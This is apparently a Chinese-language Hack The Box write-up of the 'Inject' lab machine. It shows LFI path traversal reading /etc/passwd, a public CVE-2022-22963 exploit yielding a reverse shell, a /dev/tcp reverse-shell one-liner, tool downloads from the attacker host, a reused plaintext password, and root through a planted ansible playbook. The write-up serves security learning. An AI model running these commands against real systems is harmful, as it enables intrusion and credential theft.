###### tags: `Hack the box` `HTB` `Easy` `Linux`

# Inject
```
┌──(kali㉿kali)-[~/htb]
└─$ rustscan -a 10.129.228.213 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 10.129.228.213:22
Open 10.129.228.213:8080

PORT     STATE SERVICE     REASON  VERSION
22/tcp   open  ssh         syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKZNtFBY2xMX8oDH/EtIMngGHpVX5fyuJLp9ig7NIC9XooaPtK60FoxOLcRr4iccW/9L2GWpp6kT777UzcKtYoijOCtctNClc6tG1hvohEAyXeNunG7GN+Lftc8eb4C6DooZY7oSeO++PgK5oRi3/tg+FSFSi6UZCsjci1NRj/0ywqzl/ytMzq5YoGfzRzIN3HYdFF8RHoW8qs8vcPsEMsbdsy1aGRbslKA2l1qmejyU9cukyGkFjYZsyVj1hEPn9V/uVafdgzNOvopQlg/yozTzN+LZ2rJO7/CCK3cjchnnPZZfeck85k5sw1G5uVGq38qcusfIfCnZlsn2FZzP2BXo5VEoO2IIRudCgJWTzb8urJ6JAWc1h0r6cUlxGdOvSSQQO6Yz1MhN9omUD9r4A5ag4cbI09c1KOnjzIM8hAWlwUDOKlaohgPtSbnZoGuyyHV/oyZu+/1w4HJWJy6urA43u1PFTonOyMkzJZihWNnkHhqrjeVsHTywFPUmTODb8=
|   256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIUJSpBOORoHb6HHQkePUztvh85c2F5k5zMDp+hjFhD8VRC2uKJni1FLYkxVPc/yY3Km7Sg1GzTyoGUxvy+EIsg=
|   256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICZzUvDL0INOklR7AH+iFw+uX+nkJtcw7V+1AsMO9P7p
8080/tcp open  nagios-nsca syn-ack Nagios NSCA
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

buster掃
```
┌──(kali㉿kali)-[~/htb]
└─$ ffuf -u http://10.129.228.213:8080/FUZZ -w /home/kali/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt

#                       [Status: 200, Size: 6657, Words: 1785, Lines: 166, Duration: 581ms]
                        [Status: 200, Size: 6657, Words: 1785, Lines: 166, Duration: 608ms]
#                       [Status: 200, Size: 6657, Words: 1785, Lines: 166, Duration: 604ms]
register                [Status: 200, Size: 5654, Words: 1053, Lines: 104, Duration: 308ms]
blogs                   [Status: 200, Size: 5371, Words: 1861, Lines: 113, Duration: 297ms]
upload                  [Status: 200, Size: 1857, Words: 513, Lines: 54, Duration: 387ms]
environment             [Status: 500, Size: 712, Words: 27, Lines: 1, Duration: 333ms]
error                   [Status: 500, Size: 106, Words: 3, Lines: 1, Duration: 301ms]
release_notes           [Status: 200, Size: 1086, Words: 137, Lines: 34, Duration: 295ms]
                        [Status: 200, Size: 6657, Words: 1785, Lines: 166, Duration: 295ms]
```

前往`http://10.129.228.213:8080/upload`，隨便上傳一個圖片會導到`http://10.129.228.213:8080/show_image?img=snap.PNG`

再來就可以用`LFI`trytry
```
GET /show_image?img=../../../../../../etc/passwd HTTP/1.1

Host: 10.129.228.213:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://10.129.228.213:8080/upload
Upgrade-Insecure-Requests: 1

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
frank:x:1000:1000:frank:/home/frank:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
phil:x:1001:1001::/home/phil:/bin/bash
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:997:996::/var/log/laurel:/bin/false
```

再來就可以慢慢列出其他資料夾的東西
```
GET /show_image?img=../../../../../../var/www

html
WebApp
```

```
GET /show_image?img=../../../../../../var/www/WebApp

.classpath
.DS_Store
.idea
.project
.settings
HELP.md
mvnw
mvnw.cmd
pom.xml
src
target
```

```xml
GET /show_image?img=../../../../../../var/www/WebApp/pom.xml

<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
	<modelVersion>4.0.0</modelVersion>
	<parent>
		<groupId>org.springframework.boot</groupId>
		<artifactId>spring-boot-starter-parent</artifactId>
		<version>2.6.5</version>
		<relativePath/> <!-- lookup parent from repository -->
	</parent>
	<groupId>com.example</groupId>
	<artifactId>WebApp</artifactId>
	<version>0.0.1-SNAPSHOT</version>
	<name>WebApp</name>
	<description>Demo project for Spring Boot</description>
	<properties>
		<java.version>11</java.version>
	</properties>
	<dependencies>
		<dependency>
  			<groupId>com.sun.activation</groupId>
  			<artifactId>javax.activation</artifactId>
  			<version>1.2.0</version>
		</dependency>

		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-thymeleaf</artifactId>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-web</artifactId>
		</dependency>

		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-devtools</artifactId>
			<scope>runtime</scope>
			<optional>true</optional>
		</dependency>

		<dependency>
			<groupId>org.springframework.cloud</groupId>
			<artifactId>spring-cloud-function-web</artifactId>
			<version>3.2.2</version>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-test</artifactId>
			<scope>test</scope>
		</dependency>
		<dependency>
			<groupId>org.webjars</groupId>
			<artifactId>bootstrap</artifactId>
			<version>5.1.3</version>
		</dependency>
		<dependency>
			<groupId>org.webjars</groupId>
			<artifactId>webjars-locator-core</artifactId>
		</dependency>

	</dependencies>
	<build>
		<plugins>
			<plugin>
				<groupId>org.springframework.boot</groupId>
				<artifactId>spring-boot-maven-plugin</artifactId>
				<version>${parent.version}</version>
			</plugin>
		</plugins>
		<finalName>spring-webapp</finalName>
	</build>

</project>
```


搜尋`spring-cloud-function-web 3.2.2 exploit`可找到[CVE-2022-22963](https://github.com/J0ey17/CVE-2022-22963_Reverse-Shell-Exploit/tree/main)，使用後可以得到`frank`的帳號
```
┌──(kali㉿kali)-[~/htb/CVE-2022-22963_Reverse-Shell-Exploit]
└─$ python3 exploit.py -u http://10.129.173.242:8080                                      
[+] Target http://10.129.173.242:8080

[+] Checking if http://10.129.173.242:8080 is vulnerable to CVE-2022-22963...

[+] http://10.129.173.242:8080 is vulnerable

[/] Attempt to take a reverse shell? [y/n]y
listening on [any] 4444 ...
[$$] Attacker IP:  10.10.14.54
connect to [10.10.14.54] from (UNKNOWN) [10.129.173.242] 42004
bash: cannot set terminal process group (796): Inappropriate ioctl for device
bash: no job control in this shell

frank@inject:/$ whoami
frank
```

在`.m2`資料夾裡面可以找到`settings.xml`裡面有`phil`的密碼`DocPhillovestoInject123`
```xml
frank@inject:~/.m2$ cat settings.xml

<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>
```

切成`phil`的帳號，可在`/home/phil`得到user.txt
```
┌──(kali㉿kali)-[~/htb]
└─$ rlwrap -cAr nc -nvlp4444

frank@inject:~/.m2$ su phil
Password: DocPhillovestoInject123

id
uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
/bin/sh -i >& /dev/tcp/10.10.14.54/4444 0>&1

phil@inject:~$ cat user.txt
0d433b5d8e205d4f29b5c3e2f1af7cc2
```

用linpeas.sh
```
phil@inject:/tmp$ wget 10.10.14.54/linpeas.sh
phil@inject:/tmp$ chmod +x linpeas.sh
phil@inject:/tmp$ ./linpeas.sh

╔══════════╣ Unexpected in /opt (usually empty)
total 12                                                                                                                                    
drwxr-xr-x  3 root root 4096 Oct 20  2022 .
drwxr-xr-x 18 root root 4096 Feb  1  2023 ..
drwxr-xr-x  3 root root 4096 Oct 20  2022 automation
```

發現`/opt`裡面有些東西
```yml
phil@inject:/opt/automation/tasks$ cat playbook_1.yml

- hosts: localhost
  tasks:
  - name: Checking webapp service
    ansible.builtin.systemd:
      name: webapp
      enabled: yes
      state: started
```

利用`pspy`查看...
```
phil@inject:/tmp$ wget 10.10.14.54/pspy64
phil@inject:/tmp$ chmod +x pspy64
phil@inject:/tmp$ ./pspy64

024/09/09 09:38:01 CMD: UID=0     PID=22508  | /bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml 
2024/09/09 09:38:01 CMD: UID=0     PID=22507  | /usr/sbin/CRON -f 
2024/09/09 09:38:01 CMD: UID=0     PID=22506  | /usr/sbin/CRON -f 
2024/09/09 09:38:01 CMD: UID=0     PID=22505  | /usr/sbin/CRON -f 
2024/09/09 09:38:01 CMD: UID=0     PID=22509  | /bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml 
2024/09/09 09:38:01 CMD: UID=0     PID=22512  | sleep 10 
2024/09/09 09:38:01 CMD: UID=0     PID=22510  | /bin/sh -c sleep 10 && /usr/bin/rm -rf /opt/automation/tasks/* && /usr/bin/cp /root/playbook_1.yml /opt/automation/tasks/                                                       
```

發現`/usr/local/bin/ansible-parallel`會一直執行`/opt/automation/tasks/*.yml`，我google[Ansible Playbook Reverse Shell](https://gist.github.com/Reelix/32ccf1baaa3066654a460265fca53960)，之後開啟nc把這個檔案放到`/opt`，之後等等等就得root，在/root得root.txt
```
┌──(kali㉿kali)-[~/htb]
└─$ rlwrap -cAr nc -nvlp4446

phil@inject:/opt/automation/tasks$ wget 10.10.14.54/playbook_2.yml
root@inject:~# cat root.txt
74877d8e0d4b20a778158fa0138333b6
```